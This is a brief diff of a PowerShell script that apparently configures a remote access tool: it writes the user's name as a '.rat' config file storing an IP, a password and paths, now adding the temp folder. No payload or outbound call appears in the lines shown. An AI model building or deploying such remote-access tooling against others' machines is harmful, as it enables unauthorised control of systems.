@@ -38,7 +38,8 @@ $configfile = "$env:UserName.rat"
 Set-Content -Path $configfile -Value ""
 Add-Content -Path $configfile -Value $IP
 Add-Content -Path $configfile -Value $password
-Add-Content -Path $configfile -Value $path
+Add-Content -Path $configfile -Value $INITIALPATH
+Add-Content -Path $configfile -Value $env:temp
 
 # Convert Secure Password to Plain Text
 $SecurePassword = ConvertTo-SecureString $password -AsPlainText -Force
